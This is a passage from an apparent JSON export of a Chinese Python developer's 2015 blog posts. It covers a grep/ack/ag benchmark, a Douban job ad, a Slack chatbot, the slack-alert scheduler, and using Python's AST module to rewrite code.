       f.write(contents + '\\n')\n        if total_size > size:\n            break\n    f.close()\n\n\nfor index, size in enumerate([\n        MB,\n        MB * 10,\n        MB * 100,\n        MB * 500,\n        MB * 1024,\n        MB * 1024 * 5]):\n    size_name = SIZE_LIST[index]\n    en_f = open(EN_RESULT_FORMAT.format(size_name), 'a+')\n    cn_f = open(CN_RESULT_FORMAT.format(size_name), 'a+')\n    write_data(en_f, size, EN_DATA)\n    write_data(cn_f, size, CN_DATA, True)\n```\n\n\n好吧, 效率比较低是吧? 我自己没有vps, 公司服务器我不能没事把全部内核的cpu都占满(不是运维好几年了). 假如你不介意htop的多核cpu飘红, 可以这样，耗时就是各文件生成的时间短板:\n\n\n```python\n # coding=utf-8\n\nimport os\nimport random\nimport multiprocessing\nfrom cStringIO import StringIO\n\nEN_WORD_FILE = '/usr/share/dict/words'\nCN_WORD_FILE = 'dict.txt.big'\nwith open(EN_WORD_FILE) as f:\n    EN_DATA = f.readlines()\nwith open(CN_WORD_FILE) as f:\n    CN_DATA = f.readlines()\nMB = pow(1024, 2)\nSIZE_LIST = [1, 10, 100, 500, 1024, 1024 * 5]\nEN_RESULT_FORMAT = 'text_{0}_en_MB.txt'\nCN_RESULT_FORMAT = 'text_{0}_cn_MB.txt'\n\ninputs = []\n\ndef map_func(args):\n    def write_data(f, size, data, cn=False):\n        f = open(f, 'a+')\n        total_size = 0\n        while 1:\n            s = StringIO()\n            for x in range(10000):\n                cho = random.choice(data)\n                cho = cho.split()[0] if cn else cho.strip()\n                s.write(cho)\n            s.seek(0, os.SEEK_END)\n            total_size += s.tell()\n            contents = s.getvalue()\n            f.write(contents + '\\n')\n            if total_size > size:\n                break\n        f.close()\n\n    _f, size, data, cn = args\n    write_data(_f, size, data, cn)\n\n\nfor index, size in enumerate([\n        MB,\n        MB * 10,\n        MB * 100,\n        MB * 500,\n        MB * 1024,\n        MB * 1024 * 5]):\n    size_name = SIZE_LIST[index]\n    inputs.append((EN_RESULT_FORMAT.format(size_name), size, EN_DATA, False))\n    inputs.append((CN_RESULT_FORMAT.format(size_name), size, CN_DATA, True))\n\npool = multiprocessing.Pool()\npool.map(map_func, inputs, chunksize=1)\n```\n\n\n等待一段时间后,目录下是这样的:\n\n\n```python\n$ls -lh\ntotal 14G\n-rw-rw-r-- 1 vagrant vagrant 2.2K Mar 14 05:25 benchmarks.ipynb\n-rw-rw-r-- 1 vagrant vagrant 8.2M Mar 12 15:43 dict.txt.big\n-rw-rw-r-- 1 vagrant vagrant 1.2K Mar 12 15:46 make_words.py\n-rw-rw-r-- 1 vagrant vagrant 101M Mar 12 15:47 text_100_cn_MB.txt\n-rw-rw-r-- 1 vagrant vagrant 101M Mar 12 15:47 text_100_en_MB.txt\n-rw-rw-r-- 1 vagrant vagrant 1.1G Mar 12 15:54 text_1024_cn_MB.txt\n-rw-rw-r-- 1 vagrant vagrant 1.1G Mar 12 15:51 text_1024_en_MB.txt\n-rw-rw-r-- 1 vagrant vagrant  11M Mar 12 15:47 text_10_cn_MB.txt\n-rw-rw-r-- 1 vagrant vagrant  11M Mar 12 15:47 text_10_en_MB.txt\n-rw-rw-r-- 1 vagrant vagrant 1.1M Mar 12 15:47 text_1_cn_MB.txt\n-rw-rw-r-- 1 vagrant vagrant 1.1M Mar 12 15:47 text_1_en_MB.txt\n-rw-rw-r-- 1 vagrant vagrant 501M Mar 12 15:49 text_500_cn_MB.txt\n-rw-rw-r-- 1 vagrant vagrant 501M Mar 12 15:48 text_500_en_MB.txt\n-rw-rw-r-- 1 vagrant vagrant 5.1G Mar 12 16:16 text_5120_cn_MB.txt\n-rw-rw-r-- 1 vagrant vagrant 5.1G Mar 12 16:04 text_5120_en_MB.txt\n```\n\n\n#### 确认版本\n\n```\n➜  test  ack --version # ack在ubuntu下叫`ack-grep`\nack 2.12\nRunning under Perl 5.16.3 at /usr/bin/perl\n\nCopyright 2005-2013 Andy Lester.\n\nThis program is free software.  You may modify or distribute it\nunder the terms of the Artistic License v2.0.\n➜  test  ag --version\nag version 0.21.0\n➜  test  grep --version\ngrep (GNU grep) 2.14\nCopyright (C) 2012 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\nWritten by Mike Haertel and others, see <http://git.sv.gnu.org/cgit/grep.git/tree/AUTHORS>.\n```\n\n\n#### 实验设计\n\n为了不产生并行执行的相互响应, 我还是选择了效率很差的同步执行, 我使用了ipython提供的%timeit. 上代码\n\n\n```python\nimport re\nimport glob\nimport subprocess\nimport cPickle as pickle\nfrom collections import defaultdict\n\nIMAP = {\n    'cn': ('豆瓣', '小明明'),\n    'en': ('four', 'python')\n}\nOPTIONS = ('', '-i', '-v')\nFILES = glob.glob('text_*_MB.txt')\nEN_RES = defaultdict(dict)\nCN_RES = defaultdict(dict)\nRES = {\n        'en': EN_RES,\n        'cn': CN_RES\n}\nREGEX = re.compile(r'text_(\\d+)_(\\w+)_MB.txt')\nCALL_STR = '{command} {option} {word} {filename} > /dev/null 2>&1'\n\nfor filename in FILES:\n    size, xn = REGEX.search(filename).groups()\n    for word in IMAP[xn]:\n        _r = defaultdict(dict)\n        for command in ['grep', 'ack', 'ag']:\n            for option in OPTIONS:\n                rs = %timeit -o -n10 subprocess.call(CALL_STR.format(command=command, option=option, word=word, filename=filename), shell=True)\n                best = rs.best\n                _r[command][option] = best\n        RES[xn][word][size] = _r\n\n# 存起来\n\ndata = pickle.dumps(RES)\n\nwith open('result.db', 'w') as f:\n    f.write(data)\n```\n\n温馨提示, 这是一个灰常耗时的测试. 开始执行后 要喝很久的茶...\n\n我来秦皇岛办事完毕(耗时超过1一天), 继续我们的实验.\n\n#### 我想要的效果\n\n我想工作的时候一般都是用到不带参数/带-i(忽略大小写)/-v(查找不匹配项)这三种. 所以这里测试了:\n\n1. 英文搜索/中文搜索\n2. 选择了2个搜索词(效率太低, 否则可能选择多个)\n3. 分别测试''/'-i'/'-v'三种参数的执行\n4. 使用%timeit, 每种条件执行10遍, 选择效率最好的一次的结果\n5. **每个图代码一个搜索词, 3搜索命令, 一个选项在搜索不同大小文件时的效率对比**\n\n#### 多图预警, 我先说结论\n\n1. **在搜索的总数据量较小的情况下, 使用grep, ack甚至ag在感官上区别不大**\n2. **搜索的总数据量较大时, grep效率下滑的很多, 完全不要选**\n3. **ack在某些场景下没有grep效果高(比如使用-v索索中文的时候)**\n3. **在不使用ag没有实现的选项功能的前提下, ag完全可以替代ack/grep**\n\n\n渲染图片的gist可以看这里[benchmarks.ipynb](http://nbviewer.ipython.org/gist/dongweiming/6732731444b1e2687c47/benchmarks.ipynb). 他的数据来自上面跑的结果在序列化之后存入的文件\n\n\n#### 附图(共12张)\n\n![chart](https://cloud.githubusercontent.com/assets/841395/6660016/8326d7b0-cbcb-11e4-8f2a-cfa5fe27c810.png)\n![chart-1](https://cloud.githubusercontent.com/assets/841395/6660017/832c12ac-cbcb-11e4-9295-cfdd6d421423.png)\n![chart-2](https://cloud.githubusercontent.com/assets/841395/6660018/832c3034-cbcb-11e4-9a2c-5604bf2bb0c6.png)\n![chart-3](https://cloud.githubusercontent.com/assets/841395/6660019/832df4a0-cbcb-11e4-8d75-538ad527cb4f.png)\n![chart-4](https://cloud.githubusercontent.com/assets/841395/6660020/833372d6-cbcb-11e4-8b96-54ae9ae68f57.png)\n![chart-5](https://cloud.githubusercontent.com/assets/841395/6660021/8335c04a-cbcb-11e4-8401-0c54aa4eb783.png)\n![chart-6](https://cloud.githubusercontent.com/assets/841395/6660022/8362bf96-cbcb-11e4-9ec5-94686e603e3a.png)\n![chart-7](https://cloud.githubusercontent.com/assets/841395/6690232/488e9af4-ccfa-11e4-8a1f-1fa3667dd74f.png)\n![chart-8](https://cloud.githubusercontent.com/assets/841395/6660024/836b307c-cbcb-11e4-942d-8a395a28984f.png)\n![chart-9](https://cloud.githubusercontent.com/assets/841395/6660025/836f4f5e-cbcb-11e4-8807-d6f561018254.png)\n![chart-10](https://cloud.githubusercontent.com/assets/841395/6660043/fbd42cee-cbcb-11e4-9c1d-b2237194db90.png)\n![chart-11](https://cloud.githubusercontent.com/assets/841395/6660044/fc5424f8-cbcb-11e4-9bf0-1666cd467239.png)\n",
    "date": {
      "year": "2015",
      "month": "March",
      "day": "14"
    }
  },
  {
    "id": 305,
    "title": "豆瓣条目组招聘",
    "category": null,
    "tags": [

    ],
    "url": "/archives/zhi-ding-dou-ban-tiao-mu-zu-zhao-pin/",
    "content": "#### 我来做广告\n\n豆瓣是国内python应用最广泛的公司. 没有其二. 我们条目组随着业务变更, 也需要更多地优秀工程师的加入.\n条目是指什么? 豆瓣的电影/读书/音乐, 以及豆瓣东西都是我们在维护和迭代开发(对, 你没有听错, 你不是在一个产品线).\n\n我先列一下作为一个厂公在技术层面, 我对豆瓣的感想(其他层面大家都懂):\n\n1. 豆瓣有很多知名的工程师, 包括但是不限于前后端以及IOS/Android, 你会他们协作, 吐槽他们的代码以及被他们吐槽\n2. 豆瓣多年积累了很多对工作有帮助的工具. 比如CODE, dae, 还有很多的用于运维支持, 数据分析和统计, 爬虫等项目.\n3. 豆瓣有很多开源项目, 被其他公司使用, 比如dpark, OzJS. 你有机会参与到这样的项目中\n\n#### 招聘内容\n\n简单地需求都在这里: [产品开发工程师](http://jobs.douban.com/#position-cpkf)\n\n我来解读下(以下方面能帮你提高面试通过的几率):\n\n1. 豆瓣希望你是一个倾向于全栈工程师. 比如你会python, 还能写前端, 或者有移动开发经验. 你可以想到, 我们大多是同时支持多个\n产品线, 任务重的时候如果你独当一面很好, 要是可以再别的领域帮个忙就更好了\n2. 假如你python初学,但是很熟悉其他语言, 我们相信你很快会上手, 不要害怕. 我组之前就有一个原来是ruby的实习生.\n3. 希望你能有个github/stackoverflow账号, 或者个人博客. 尤其是能看到你的作品, 了解你的代码, 希望看到你对代码的热爱. 我相信你有主动的态度会走的更远\n4. 如果你曾经是某个/些开源项目的贡献者甚至是多次贡献者, 或者你曾经做过分享, 也请记得一并告诉我们.\n\n\n#### 联系我们\n\n想想还是先联系我吧. 我会给大家转发到组内. 或者直接`在线申请`\n\n我的邮箱是: ciici123#gmail.com. 请在标题中注明[豆瓣求职]\n",
    "date": {
      "year": "2015",
      "month": "March",
      "day": "24"
    }
  },
  {
    "id": 306,
    "title": "python-cn社区欢迎大家来贡献代码",
    "category": "firefly",
    "tags": [
      "firefly",
      "python-cn"
    ],
    "url": "/archives/python-cnshe-qu-huan-ying-da-jia-lai-gong-xian-dai-ma/",
    "content": "#### 前言\n\n一次QQ群随意一说,得到大家的认同. 所有我想把这件事坚持下去, 做完.\n\n具体的可以看 http://python-cn.org. 在社区没有上线前, 保持低调，欢迎你来参观.\n\n#### 社区项目\n\n[firefly](https://github.com/python-cn/firefly). 欢迎star, 欢迎PR - 其实我要star没用, 但是我希望你能来给我提个Pull request.\n",
    "date": {
      "year": "2015",
      "month": "April",
      "day": "22"
    }
  },
  {
    "id": 307,
    "title": "slack上的小黄鸡 - SlackBot",
    "category": "python",
    "tags": [

    ],
    "url": "/archives/slackshang-de-xiao-huang-ji-slackbot/",
    "content": "### 前言\n\n[Slack](http://www.slack.com/)是一个最近一年兴起的团队沟通协作平台. 程序员对工具其实是最有品位和要求的，相信国内很多公司和团队都在使用，豆瓣也算比较早在用.\n相信用过的人会理解本文. 如果你还没有接触它, 尤其是对现有的团队沟通协作工具有些不满, 可以试一下.\n\n本文就是介绍我们在最近做出来的一个bot - [slack_bot](https://github.com/python-cn/slack_bot). 它的口号是: 立志成为一个可被调戏且有用的Bot\n\n### 为什么\n\n无论是运维还是开发, 某些时间都会收到一些邮件/提醒, 可能是固定的时间的定时任务跑出来的结果,\n也可能是某个故障引起的问题邮件. 我们都很烦手头有好几个东西来接收这些消息， 而slack可以使用某些方法让这些问题集中起来.\n\n比如很常用的, 使用[chat](https://api.slack.com/methods/chat.postMessage)或者[incoming-webhooks](https://api.slack.com/incoming-webhooks)接收消息. 做什么呢?\n我可以把一些昨天的数据汇总或者汇总的地址在今天早上发到某个channel下, 这样想要看这个数据的人直接点进去就好了.\n当然啦, 也可以直接发消息到某个人. 一个具体的例子: 豆瓣的同事都知道, 我们的测试环境时间过期就会被删除, 在某段时间里面每天都有很多人在关注我们要新上的一个测试的地址,\n但是经常被同事@, 说地址怎么找不到了, 那么我就要抽出精力再去创建一个. 后来一想, 索性跑个定时任务, 拉最新的代码, 走逻辑, 生成一个测试环境. 每天都会在channel里面发消息给对应关心这个消息的人.\n一段时间以后, 我们的工作完成了, 同事都有点不适用, 哎， 怎么早上看不到那个消息了...\n\n但是今天说的是什么呢? 我们的slack_bot主要借用[outgoing-webhooks](https://api.slack.com/outgoing-webhooks). incoming表示把消息推到slack里面,\noutgoing其实就是当有人在某些符合的channel里面说了什么, 会跳到我们提供的回调地址, 根据内容返回对应符合的回复. 大家是不是有点懂了, 这就是小黄鸡的原理.\n\n说到这里大家应该明白了. 其实slack给我们提供了很大的想象和实现的空间. 我立刻想起来做运维时候做的一些事情:\n\n比如当时有时候要去机房, 路上没有网(2g上网太慢), 有时候想看个监控状态, 切个负载均衡, 重启个服务什么的, 后来做了一个东西, 就是给某些号码发某些特殊的短信内容就可以获得想要的结果, 执行想做的事情.\n其实slack_bot只是一些爬虫的集合, 一些功能实现的例子. 在实际开发和工作中可以做很多更有意思的, 公司内部的插件. 和公司的业务相关, 和自己做的事情相关. 这样在路上就能用.\n比如我的地图功能, 我可以在网络不好的时候找到行程的最好路线; 我用公交插件可以实时的看我要等的公交需要多久到达, 我可以踩着点去站牌....\n\n### 小黄鸡原理\n\n小黄鸡很火的时候, 我还是一个perl运维...\n\n小黄鸡其实调用的是[simsim](http://developer.simsimi.com/)的接口. 大家都可以去注册一个key来玩,也可以用项目自带的.\n\n其实就是post一个数据到simsim的api上, 他会返回你对应的小黄鸡的回复.\n\n### 项目介绍\n\n很多人听过甚至曾经用过[小黄鸡](https://github.com/wong2/xiaohuangji-new). 你可以把本bot理解为`增加了很多\n功能`, `只保留小黄鸡交流的基本逻辑`, `用于slackchannel里面`的`小黄鸡`\n\n项目使用flask, 目前本项目是一个heroku应用. 地址是 https://slack-bot2.herokuapp.com/slack_callback 但是你\n也可以直接裸跑\n\n```python\ngunicorn wsgi:app localhost:5000 --timeout 240 --log-file -\n```\n\n你也可以使用heroku创建一个新的应用, 直接用我们的项目代码就可以.\n\n### 我们使用slack的特性\n\n1. 可以把消息私聊发给自己\n2. 可以使用带图的方式接收结果(支持canvas, 以下会看到例图)\n\n### 继承自小黄鸡的模块们, 但是都做了对应的修改:\n\n1. 空气插件\n2. wikipedia\n3. 地震了\n4. 糗百\n5. orz  # orz需要自定义emoji\n\n### 新加的模块们:\n\n#### 地图插件 - 你可以输入我想从哪去哪, 会给你个路线(步行/开车/公交)\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/map.png)\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/map2.png)\n\n#### 天气插件 - 使用了百度api, 获得城市的天气情况\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/weather.png)\n\n#### 北京公交插件 - 可以查询北京公交线路, 获取实时的到某站的信息(有些线路站点不准)\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/bus.png)\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/bus2.png)\n\n#### 美食插件 - 使用大众点评网api, 获取附近餐饮信息, 评分, 电话地址,距离等等\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/dianping.png)\n\n#### 技术活动插件 - 从segmentfault/csdn/车库咖啡/活动行获得最近的活动列表\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/events.png)\n\n#### Github_issue插件 - 获得你个人或者组织下未处理的Pull requests列表\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/issue.png)\n\n#### 电影信息插件 - 列出最近上映和即将上映的电影信息\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/movie.png)\n\n#### pycoders插件 - 获得<pycoders weekly>订阅数据\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/pycoders.png)\n\n#### pythonweekly插件 - 获得<pythonweekly>订阅数据\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/pythonweekly.png)\n\n#### 头条插件 - 获得今日头条新闻\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/toutiao.png)\n\n#### travel插件 - 旅游推荐/景点介绍\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/travel.png)\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/travel2.png)\n\n#### v2ex feed插件 - 获得一些节点的最新feed\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/v2ex.png)\n\n#### help插件 - 列出所有插件的帮助信息\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/help.png)\n\n#### 最主要的是小黄鸡(simsim)\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/simsim.png)\n\n#### 也可以直接发到个人的slackbot channel里:\n\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/direct.png)\n![](https://raw.githubusercontent.com/python-cn/slack_bot/master/screenshots/direct2.png)\n\n\n### 配置slack\n\n去你的slack组织的services页面. 比如我们是 https://pythoncn.slack.com/services/new. 找到`Outgoing WebHooks`:\n\n![](https://cloud.githubusercontent.com/assets/841395/8311561/9ef87dc2-1a09-11e5-9d87-132d8d534042.png)\n\n点击`Add+`并确认到新建页面:\n\n![](https://cloud.githubusercontent.com/assets/841395/8311562/9efaffa2-1a09-11e5-8584-58894ae6e254.png)\n\n`channel` 可以选择any,也可以指定单独一个. `Trigger Word(s)` 可以不填, 那就是所有的记录都会走.\n也可以找关键词/字, 用逗号隔开. `url`就是你控制的回调的地址. 本图中的是我们用的herokuapp地址: https://slack-bot2.herokuapp.com/slack_callback\n\n你还可以自定义icon的图标和名字:\n\n![](https://cloud.githubusercontent.com/assets/841395/8311563/9efe2ff6-1a09-11e5-8492-1dd39c4ae1d6.png)\n\n\n### 实现原理\n\n我还是抄袭了[小黄鸡](https://github.com/wong2/xiaohuangji-new)的插件思想. 但是完全脱离和小黄鸡的代码关系. 只留下了几个原有的插件并更新.\n[plugins](https://github.com/python-cn/slack_bot/tree/master/slack_bot/plugins)目录下有一些插件.\n系统会按照plugins/\\_\\_init\\_\\_.py里面的__all__的列表顺序, 挨个插件对比是否符合. 符合即停止. 都不符合最后会使用simsim模块\n\n具体的插件编写可以参看项目的[插件编写](https://github.com/python-cn/slack_bot/blob/master/README.md#插件编写)\n\n### 一些trick\n\n1. 假如你没有设置`Trigger Word`. 你要保证你的回复可以被停止, 否者你的回复会被当成下一次的输入. 这样就死循环了. 比如我们使用一个函数,\n只要文本用`!`开头就不会回调. 表示这个是一个正常的,不想被out-going的记录.\n2. 这里的天气图片是一个html5的data image. 还有豆瓣电影的海报图片做了防盗链， 不能被slack识别和正常显示.\n我的用法是upload到slack. 获得返回的url.然后在生成附件.\n3. direct message其实是被限定了post的长度. 太长的话会报414. 需要对长数据切分. slack_bot已经实现了\n4. 现在simsim的借口被玩坏了, 有些低级，无聊，带有攻击性的回复. 酌情使用\n",
    "date": {
      "year": "2015",
      "month": "June",
      "day": "23"
    }
  },
  {
    "id": 308,
    "title": "slack-alert - 把定时任务的结果发送slack消息的微框架",
    "category": "slack",
    "tags": [
      "slack",
      "ast"
    ],
    "url": "/archives/slack-alert-ba-ding-shi-ren-wu-de-jie-guo-fa-song-slackxiao-xi-de-wei-kuang-jia/",
    "content": "#### 前言\n\n为什么要做[slack-alert](https://github.com/dongweiming/slack-alert)呢? 成因其实是我一直想做的AST相关的一个项目.\n正好是一个机会. 其次也是业务需要:\n\n工程师都比较懒, 在每天的各种问题邮件几百几千封的时候会经常遗漏重要的邮件. 会经常被用户以及公司其他同事发现问题时@到时候才发现.\n现在大家也接受了slack这个工具. 那么我就在想何不把更重要的消息发送到slack里呢.\n\n原来也做过, 就是写一些脚本, 会把运行的结果通过[slacker](https://github.com/os/slacker)里面封装的[postMessage](https://api.slack.com/methods/chat.postMessage)发消息进来.\n先说一下为什么我不用[Incoming-webhooks](https://api.slack.com/incoming-webhooks). 最主要的, 因为通常slack都是用的免费版, 我担心对webhooks会有限制或者未来会有限制.\n\n但是为什么做这个`微框架`呢? 一则这样的脚本和任务会越来越多, 脚本需要设置的定时任务的间隔也会各不相同. 用系统自带的crontab, 每次新增修改删除都要去做调整.\n代码还需要做抽象; 用celery, rq这些其实一是很浪费, 二也不怎么应景. 所以我写了这个工具.\n\n\n#### 优点和特点\n\n1. 只支持python3\n2. 支持多种调度模式: AsyncIOScheduler, BackgroundScheduler, GeventScheduler, TornadoScheduler. 默认是AsyncIO\n3. 使用[AST](https://docs.python.org/3/library/ast.html), 而没有直接import代码.\n4. 代码和项目无关, 没有register. 只需要按格式编写plugin脚本即可, 要被执行的任务加一个装饰器(只需要他是一个装饰器, 不需要存在). 指定运行的间隔就好\n5. 附带常用的配置\n\n\n#### 安装\n\n```\npip install slack-alert\n```\n\nslack-alert有个默认的配置[slack_alert.conf](https://github.com/dongweiming/slack-alert/blob/master/slack_alert.conf).\n使用`OS X`或者`linux`可以拷贝到 `~/.config/slack_alert.conf`\n\n#### 编写插件\n\nPS: 插件目录默认是当前目录的`plugins`子目录下.\n\n```\ntree plugins\nplugins\n├── examples.py\n\n0 directories, 1 files\n```\n\n```python\n# coding=utf-8\nimport os\n\n\n@deco(seconds=2)  # 这个一个正确格式的任务, 因为装饰器里面包含`hours|seconds|minutes|days`这样的键.\ndef a():\n    print(1)  # 插件也需要python3的语法\n    print(os)  # 可以使用外部的变量\n    return 1  # 这个返回值最后会被发送到slack的channel里面\n\n\ndef b():  # 这个函数因为没有对应的格式的装饰器 他不会被当做一个任务\n    print(3)\n    return 2\n\n\n@deco2(xx=1)\n@deco(minutes=2, seconds=30)\ndef c():  # 这个函数也不是一个正确格式的装饰器. 我需要把`deco`放在最外面\n    print(4)\n    return 3\n```\n\nPS: 大家不要迷惑为什么`deco`这个函数没有介绍. 因为我只需要这个代码文本. 我其实不直接运行这个脚本. 所以不需要装饰器存在.\n\n#### 使用\n\n```\nslack-alert\n```\n\n这样就启动了.\n\n`a`这个函数就会每隔2秒运行一次， 运行三次后, 停顿60分钟... 这样循环(高级用法看下面的参数). 并且把结果发送到slack里面\n\n#### 原理\n\n1. 启动`slack-alert` 我首先加载配置.\n2. 我会根据配置`--path`去找我应该去哪个文件目录下(默认是当前目录)的`plugins`子目录下去找符合的任务程序.\n3. 加载符合的目录下的每个python文件. 生成一个AST(抽象语法树).\n4. 遍历这棵树. 找到符合我需要的语法的函数. 去掉这个实际不存在的装饰器. 编译源码并且执行. 生成一个命名空间\n5. 获取这个命名空间的参数, 通过[apscheduler](http://apscheduler.readthedocs.org/en/latest/). 添加一个任务\n6. 添加全部任务. 再添加一个监控这些任务的任务(主要是用来在某些时机停掉/启动其他某些任务)\n7. 启动任务调度. 直到`Ctrl+C`\n\n\n#### 高级选项\n\n可以参照源码的选项:\n\n1. [Config file\"s Options](https://github.com/dongweiming/slack-alert#config-files-options)\n2. [Command Options](https://github.com/dongweiming/slack-alert#command-options)\n",
    "date": {
      "year": "2015",
      "month": "July",
      "day": "26"
    }
  },
  {
    "id": 309,
    "title": "AST - 像lisp一样自定义代码行为",
    "category": "ast",
    "tags": [
      "ast"
    ],
    "url": "/archives/ast-xiang-lisp%5B%3F%5D-yang-zi-ding-yi-dai-ma-xing-wei/",
    "content": "### 前言\n\n学common lisp(以下除非特殊需要说明的都简称lisp)以及用emacs的人都有一个体会 - lisp无所不能, 可以使用lisp修改lisp的行为. 什么意思呢?\n\n我来举个例子. 我希望重置`+`的行为为实际意义的减法`-`. 看起来这是语言不可能完成的任务, 对lisp来说很简洁(我使用sbcl):\n\n```bash\n* (+ 1 1)\n\n2  ; 正确结果\n* (shadow '+)\n\nT\n* (defgeneric + (a &rest b))\n\n#<STANDARD-GENERIC-FUNCTION + (0)>\n* (defmethod + ((a number) &rest b) (apply 'cl:- a b))\n\n#<STANDARD-METHOD + (NUMBER) {1002E43E73}>\n* (+ 1 1)\n\n0  ; 这里的加号的意义其实是我们所理解的`减号`\n```\n\n是不是很神奇?\n\n那么对于python这种高级语言能不能做到呢? 答案是肯定的. 我们马上就来实现它\n\n```python\nIn [1]: import ast\n\nIn [2]: x = ast.parse('1 + 1', mode='eval')\n\nIn [3]: x.body.op = ast.Sub()\n\nIn [4]: eval(compile(x, '<string>', 'eval'))\nOut[4]: 0\n```\n\n我想大家开始明白AST有多大能量了吧?\n\n\n### AST的故事\n\n[AST](https://docs.python.org/2/library/ast.html)中文叫做抽象语法树,\n也就是`分析当前版本的python代码的语法, 用一种树的结构解析出来`.\n这个模块提供给我们一个在编译代码之前, 用python语言本身去修改.\n\n它的作者是Armin Ronacher.\n如果你听过或者觉得似曾相识, 对. 他就是mitsuhiko - flask的作者.\n也是[pocoo](http://www.pocoo.org/)的leader之一(另外一个是看起来不知名的birkenfeld - 对我来说他很有名).\n\n那么AST有什么意义呢? 但是有绝大多数人其实不了解也用不到这个模块, 为什么呢?\n\n1. 出现需要对代码默认行为做更改的场景很少\n2. 它主要用来做静态文件的检查, 比如pylint, pychecker，以及写flake8插件. 而我们平时的写代码都是在运行不需要进行预先的语法检查之类, 那么实际接触它就很难得了.\n\n\n### 一些文章的索引\n\n为了对本文有更深的理解可以看看以下文章\n\n[AST 模块：用 Python 修改 Python 代码](http://pycoders-weekly-chinese.readthedocs.org/en/latest/issue3/static-modification-of-python-with-python-the-ast-module.html#cpython)这里对流程说的很好了. 可以直接读一下\n\n模块代码也写得非常精炼, 可能不直接让你明白, 那么这时候可以看看\n\n[Abstract Syntax Trees](http://greentreesnakes.readthedocs.org/), 这个时候我再强调一下作者吧, takluyver是ipython的核心开发成员, 他也参与了很多我们常用的开源项目, 比如pexpect和pandas\n\n上面的2篇文章写了很多, 既有理解, 也有一些初级的用法.\n\n### 我个人用它的例子\n\n最近做的[slack-alert](https://github.com/dongweiming/slack-alert). 先说它和AST的关系:\n\n1. 我没有使用注册或者import的方式，而是直接去遍历文件, 找到符合我要求的函数当做一个任务需要执行的任务\n2. 任务就要设置间隔, 那么会加某种格式的装饰器, 装饰器的参数就是间隔类型, 比如`@deco(seconds=10)`表示没十秒跑一次的意思\n3. 我这样就可以放心的写plugin就好了, 我只关注任务本身的逻辑. 而这个装饰器(类似上面说的@deco), 它其实是不存在\n4. 这个特殊格式的装饰器本身不存在没有关系, 因为我不会直接运行代码, 我只是把代码通过AST的处理, 解析出我要的任务和任务的执行间隔. 再去编译代码.\n\n\n上代码:\n\n```python\nclass GetJobs(ast.NodeTransformer):\n\n    def __init__(self):  # 原来的ast.NodeTransformer其实没有__init__方法\n        self.jobs = []\n\n    def get_jobs(self):  # 一个方便的获得任务的方法\n        return self.jobs\n\n    def get_job_args(self, decorator):  # 这属于解析装饰器这个结构, 拿到执行的间隔\n        return {k.arg: k.value.n for k in decorator.keywords\n                if k.arg in ('hours', 'seconds', 'minutes', 'days')\n                and isinstance(k.value, ast.Num)}\n\n    def visit_FunctionDef(self, node):  # 这个visit_xxx的方法被重载的时候, 就会对这个类型的语法加一些特殊处理. 因为我设计的时候只有函数才有可能是任务\n        decorator_list = node.decorator_list  # 或者一个函数的装饰器列表\n        if not decorator_list:\n            return node  # 没有装饰器明显不是我想要的任务, 可能只是一个helper函数而已\n        decorator = decorator_list[0]  # 这里我把最外面的装饰器取出来看看是不是符合我要的格式\n        args = self.get_job_args(decorator)\n        if args:  # 当获得了适合的参数, 那么正确这个格式是正确的\n            node.decorator_list = decorator_list[1:] # 最外面的装饰器就是语法hack, 它不存在也没有意义，以后完成历史任务 去掉之\n            self.jobs.append((node.name, args))\n        return node\n\n\ndef find_jobs(path):\n    jobs = []\n    for root, dirs, files in os.walk(path):\n        for name in files:\n            file = os.path.join(root, name)\n            if not file.endswith('.py'):\n                continue\n            with open(file) as f:\n                expr_ast = ast.parse(f.read())  # 读文件, 解析\n                transformer = GetJobs()\n                sandbox = {}  # 其实就是把执行放在一个命名空间里面, 因为最后我还是会把任务编译执行的, 我在这里面存了执行后的环境\n                exec(compile(transformer.visit(expr_ast),\n                             '<string>', 'exec'), sandbox)\n                jobs.extend([(sandbox[j], kw) for j, kw in transformer.jobs])\n    return jobs\n```\n\n其实看起来不能完成的事情, 就是这么简单.\n",
    "date": {
      "year": "2015",
      "month": "July",
      "day": "29"
    }
  },
  {
    "id": 310,
    "title": "[置顶]豆瓣条目组招聘-产品开发",
    "category": null,
    "tags": [

    ],
    "url": "/archives/dou-ban-tiao-mu-zu-zhao-pin/",
